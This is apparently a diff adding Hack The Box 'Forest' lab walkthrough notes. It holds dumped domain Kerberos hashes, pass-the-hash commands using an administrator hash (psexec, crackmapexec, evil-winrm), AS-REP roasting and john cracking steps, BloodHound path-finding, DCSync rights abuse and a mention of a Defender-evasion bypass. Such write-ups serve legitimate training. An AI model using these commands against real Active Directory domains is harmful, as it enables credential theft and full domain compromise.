+htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
+htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
+htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
+htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
+htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
+htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
+htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
+htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
+htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
+htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
+htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
+htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
+htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
+htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
+htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
+htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
+htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
+htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
+htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
+htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
+htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
+htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
+htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
+htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
+htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
+john:aes256-cts-hmac-sha1-96:361654f808bb7288e362af818416ea06d27f39e8990c0ec7c463bc74807c2feb
+john:aes128-cts-hmac-sha1-96:8fef77f800a032c633ad2f8029ba425c
+john:des-cbc-md5:dcc8293dae3e758c
+gr4y:aes256-cts-hmac-sha1-96:0b92b8c0ff38c4d64a4c3f4e27d9553782fdd9a6759102a297574a811ea79454
+gr4y:aes128-cts-hmac-sha1-96:7de7975208d49bbfb3a0de5c175f8bd7
+gr4y:des-cbc-md5:7cb0e64fbc1c57c7
+john2:aes256-cts-hmac-sha1-96:34490f1deea7029f963f3d0dd8fe180ee041e4b96616a9dc8d6c8bd3da862d9e
+john2:aes128-cts-hmac-sha1-96:fb98fe089298d0404aac3f6d5eb5d822
+john2:des-cbc-md5:23ea6d04a8c1c73d
+luqman:aes256-cts-hmac-sha1-96:70dc90249125d4cf71e57487b2d48389995ead998e7291cdd2dff1f78f808260
+luqman:aes128-cts-hmac-sha1-96:cb9065e340e29f373837d2e59ed60049
+luqman:des-cbc-md5:f22a8adcad80f192
+kate:aes256-cts-hmac-sha1-96:1fd45aaf28bfc75d18061fa0a638279b32501ff6398321615dd6ccd09ee17104
+kate:aes128-cts-hmac-sha1-96:ac3759ce101659c4fe2655fc5436a03f
+kate:des-cbc-md5:40c1ecdcd5941370
+FOREST$:aes256-cts-hmac-sha1-96:b3004114d3735c1b65e8050c127d218af1ebf3d2da80a1d0dc863758ad6ec86c
+FOREST$:aes128-cts-hmac-sha1-96:59a2773f2ef95766dbe2a1ebea738849
+FOREST$:des-cbc-md5:2ffefe73089b6283
+EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
+EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
+EXCH01$:des-cbc-md5:8c45f44c16975129
+[*] Cleaning up... 
+```
+- now we will see that we have obtained the hashes of all the users in the Domain
+- so we can pass this hash using psexec and we have privileged access!!!
+```
+impacket-psexec -hashes 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6' -dc-ip 10.10.10.161 administrator@10.10.10.161 
+```
+
+![](assets/Forest_assets/Pasted%20image%2020230804201111.png)
+
+- Now we have our root flag
+
+![](assets/Forest_assets/Pasted%20image%2020230804201624.png)
+
+- we can also verify this using crackmapexec
+```
+crackmapexec smb 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -d htb.local
+```
+
+![](assets/Forest_assets/Pasted%20image%2020230804203402.png)
+
+- or also gain access with `evil-winrm`
+```
+evil-winrm -i 10.10.10.161 -u administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+```
+
+![](assets/Forest_assets/Pasted%20image%2020230804203756.png)
+
+- finally we can cleanup those DCSync rights using
+```
+Remove-DomainObjectAcl -PrincipalIdentity gr4y -Credential $Cred -TargetIdentity htb.local -Rights DCSync
+```
+
+Reference
+- [Active Directory penetration testing cheatsheet | by Ayrat Murtazin | InfoSec Write-ups (infosecwriteups.com)](https://infosecwriteups.com/active-directory-penetration-testing-cheatsheet-5f45aa5b44ff)
+- [DCSync - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
+- [Add-DomainObjectAcl - PowerSploit](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/)
+
+#### HTB Writeup
+#### LDAP
+
+- LDAP is used for directory services like Active Directory service. it is a directory service protocol
+- The purpose of LDAP is to provide a standardized way for individuals to access and interact with a directory service
+- Directory services securely manage users and their access rights to IT resources within an organization using certain protocols
+- LDAP is just one of the core protocols used for these directory services, other protocols used by directory services are Kerberos, SAML, RADIUS, SMB, OAuth etc.
+- LDAP is an Application layer protocol that uses port 389 via TCP or UDP
+- most common use of LDAP is managing user accounts and authentication
+- it provides a mechanism to access and query directory services systems
+- LDAP organizes directory in a hierarchical tree like structure known as Directory Information Tree(DIT)
+- DIT is composed of entries, and each entry represents an object (e.g. user or group), and it is identified by a Distinguished Name (DN)
+- clients interact with the LDAP server using the following operations:
+	- Bind: Authenticates the client to the server(client provides credentials)
+	- Search: search for specific entries in the directory
+	- Add: Adds a new entry
+	- Modify
+	- Delete
+	- Compare: compare an attribute value in an entry with a specified value
+	- Abandon: Abandons a previous request that hasn't received a response yet
+- to specify an LDAP server and a particular entry within the directory, an LDAP URL is used and it usually looks like `ldap://ldap.example.com:389/dc=example,dc=com`
+- in the above URL `dc=example,dc=com` is the Distinguished Name of the the base entry (root) where the search should start
+- More on [Learn About LDAP – LDAP.com](https://ldap.com/learn-about-ldap/)
+- you can search for entries in an LDAP directory tree using tools like ldapsearch, windapsearch, even nmap
+- so in our scenario we will run `ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.10.10.161`
+	- the `-x` is for simple authentication(send username and password in clear text, but in this case it is used for anonymous authentication, since we don't provide any additional authentication information
+	- the `-b` is to specify the search base(base entry, that is the base dn for the search(to start from)
+	- `-H` the LDAP URI, we can do `-h` to specify just the IP
+	- `-p` to specify the port
+![](assets/Forest_assets/Pasted%20image%2020230805192943.png)
+- More at [How To Search LDAP using ldapsearch (With Examples) – devconnected](https://devconnected.com/how-to-search-ldap-using-ldapsearch-examples/)
+- we can use the [windapsearch](https://github.com/ropnop/windapsearch) tool to query the LDAP server further
+- install by:
+	- `git clone https://github.com/ropnop/windapsearch.git`
+	- `pip3 install -r requirements.txt`, if you get an error do `sudo apt install libsasl2-dev libldap2-dev libssl-dev` then rerun the command
+- so we can do `python3 windapsearch.py -d htb.local --dc-ip 10.10.10.161 -U`
+	- `-U` is to enumerate all AD users i.e. objects with `objectCategory` set to `user`
+![](assets/Forest_assets/Pasted%20image%2020230805195946.png)
+- we find mailbox accounts as well which means that Exchange is installed in the domain
+- we can enumerate other objects installed in the domain using the `objectClass=*` like `python3 windapsearch.py -d htb.local --dc-ip 10.10.10.161 --custom objectClass=*`
+	- the `--custom` Perform a search with a custom object filter by providing a valid LDAP filter syntax
+![](assets/Forest_assets/Pasted%20image%2020230805195836.png)
+- we will find the `svc-alfresco` user and if we had looked deeper into this it would lead us to this setup [documentation](https://docs.alfresco.com/process-services1.8/tasks/ps-auth-kerberos-ADconfig.html)
+- According to this, the service needs Kerberos pre-authentication to be disabled. This means that we can request the encrypted TGT for this user. 
+- and then we can obtain the user's hash from this TGT, and then bruteforce it to see if we can obtain the actual password
+- we can run GetNPUsers.py script to request a TGT and dump the hash for the user, so we do `impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass`
+![](assets/Forest_assets/Pasted%20image%2020230805200844.png)
+- then we crack using JtR like `john hash --fork=4 -w=/usr/share/wordlists/rockyou.txt`
+![](assets/Forest_assets/Pasted%20image%2020230805201249.png)
+- then connect with `evil-winrm` using the gotten password
+- then run bloodhound `./bloodhound.py -u svc-alfresco -p s3rvice -ns 10.10.10.161 -d htb.local -gc forest.htb.local -c All`
+- we can view the group memberships of the svc-alfresco node and see it is part of the Account Operators group which is a privileged group [https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators)
+- members of the Account Operators group are allowed create and modify users and add them to non-protected groups. 
+- In Queries, we can view the Shortest Path to High value targets
+- so we then find the path to the Exchange Windows Permissions  groups and so on
+- so before we can download and import the PowerView script we first have to do the following
+![](assets/Forest_assets/Pasted%20image%2020230805202248.png)
+- The Bypass-4MSI command is used to evade defender before importing the script. Next, we can use the Add-ObjectACL 
+- then you can do the remaining
+
+## Forest Walkthrough notes
+- `nmap -v -sC -sV -oA nmap/forest <ip>` and in other tab `sleep 300; nmap -p- -oA nmap/forest-allports -v <ip>` (wait 5 minutes)
+- ping IP, if ttl is 127(or 64-127) then windows if 64 (or below)then windows, cisco router is 255, but not always
+- check the website
+- port 445 `smbclient -L ip`
+- DNS, try and leak hostname, port 53 `nslookup` then `server <ip>`, then 127.0.0.1 then 127.0.0.2 then look up it self by typing its `<ip>`
+- identify all ports using [Port 0 (tcp/udp) :: SpeedGuide](https://www.speedguide.net/port.php) or [Service Name and Transport Protocol Port Number Registry (iana.org)](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml)
+- port 389, ldap so `ldapsearch -h <ip> -x` -x for simple authentication
+	- then `ldapsearch -h <ip> -x  -s base namingcontexts` and it will get us the dn
+	- copy the dn and `ldapsearch -h <ip> -x -b DC=htb,DC=local > ldap-anonymous.out`
+	- you can get a bunch of groups using `cat ldap-anonymous.out | grep -i memberof`
+- Use IPPSECrocks to search the service
